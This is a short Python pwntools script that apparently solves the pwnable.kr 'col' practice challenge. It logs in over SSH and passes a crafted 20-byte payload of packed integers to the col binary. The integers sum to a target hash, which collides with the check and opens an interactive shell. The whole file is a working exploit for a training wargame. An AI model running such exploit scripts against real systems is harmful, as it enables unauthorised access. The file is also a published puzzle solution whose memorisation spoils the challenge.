from pwn import *

ssh = ssh('col', 'pwnable.kr', 2222, 'guest')

hash_code = 0x21dd09ec
print(f"hash_code: {hash_code}")

payload = hash_code//5
print(payload)
red = hash_code%5 + payload
print(f"red:{red}")

payload = 4*p32(payload) + p32(red)
print(f"payload:{payload}")

sh = ssh.process(['col', payload])
sh.interactive()